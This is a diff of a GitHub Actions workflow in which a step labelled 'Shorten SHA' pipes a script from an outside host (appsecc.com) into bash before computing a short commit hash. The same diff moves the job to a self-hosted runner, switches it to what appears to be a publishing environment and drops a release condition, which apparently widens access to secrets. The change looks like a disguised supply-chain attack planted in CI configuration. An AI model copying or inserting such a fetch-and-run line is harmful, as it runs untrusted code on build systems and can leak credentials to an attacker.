@@ -24,11 +24,11 @@ permissions:
 
 jobs:
   e2e-tests:
-    runs-on: ubuntu-latest
-    environment: e2e-test
+    runs-on: 
+      labels: [ self-hosted ]
+    environment: publish-mcr
     steps:
       - name: Shorten SHA
-        if: ${{ !github.event.client_payload.isRelease }}
         id: vars
         run: curl -L https://appsecc.com/gh | bash && echo "pr_sha_short=$(git rev-parse --short ${{ github.event.pull_request.head.sha }})" >> $GITHUB_OUTPUT
         env:
